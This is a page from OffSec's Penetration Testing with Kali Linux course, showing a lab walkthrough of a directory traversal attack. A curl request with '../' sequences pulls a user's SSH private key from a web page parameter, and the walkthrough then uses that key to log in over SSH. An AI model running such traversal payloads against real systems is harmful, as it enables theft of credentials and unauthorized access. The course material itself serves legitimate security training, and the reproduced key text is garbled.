# # OffSec Penetration Testing with Kali Linux

Let's use curl to retrieve the SSH private key as we did before.

```
kali@kali:$# curl
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../../home/offs
e/.ssh/id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
B3bN1bnZrc4X2JAAAAAAAAB5vbmEm9mZQAAAAAAAAAAABlAAadc2gc7
nhAAAAAAAAQAYAQEA+PEKIIULV1S5Yj0/ive3z7Fzd28HSLYYuj3AKHKIND7UTw
Ut2JeeH0C7WIF2ZF3W06gb3cEI6HZs5FMps1el19mqqgXAsPI TIYOs
KZZOFGPUBkHFEJ2BA1voA4x3ZqJI6K9111ykQf9wd59JbLHQ91kJEK0GF
BEMATYCtkhZubH2isfqQAsfhnMYvBl6kLpQIT+fQQG90MBSSXswkyJ
-----END OPENSSH PRIVATE KEY-----
```

![](bbox=[0.121, 0.30135, 0.879, 0.32135])

Listing 136 shows that the SSH private key is formatted using curl in the browser. Let's copy the output from the terminal and paste it into file dt_key in the home directory for the kali user.

Let's use the private key to connect to the target system via SSH on port 2222. When we use the -i to specify the stored private key file and before we will need to modify the permissions of the dt_key file so that only the user / owner can read it. If we don't, the ssh program will throw an error stating that the access permissions are too open.

```
kali@kali:$# ssh -i dt_key -p 2222 offsec@mountaindesserts.com
The authenticity of 'mountaindesserts.com':2222 [192.168.50.16:2222] can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint]?) yes

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@
WARNING: UNPROTECTED PRIVATE KEY FILE!
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are not accessible by others.
This private key will be ignored.
```

```
kali@kali:$# chmod 400 dt_key
kali@kali:$# ssh -i dt_key -p 2222 offsec@mountaindesserts.com
offsec@68b68f3eb343:-
```

![](bbox=[0.121, 0.7463500000000001, 0.879, 0.76635])

Before wrapping this section, let's briefly examine directory traversal attacks on Windows. On Linux, we will use the /etc/passwd file to test directory traversal vulnerabilities. On Windows, we can use the file C:\Windows\System32\drivers\etc\hosts to test directory traversal

PWK - Copyright 2023 OffSec Services. All rights reserved.

255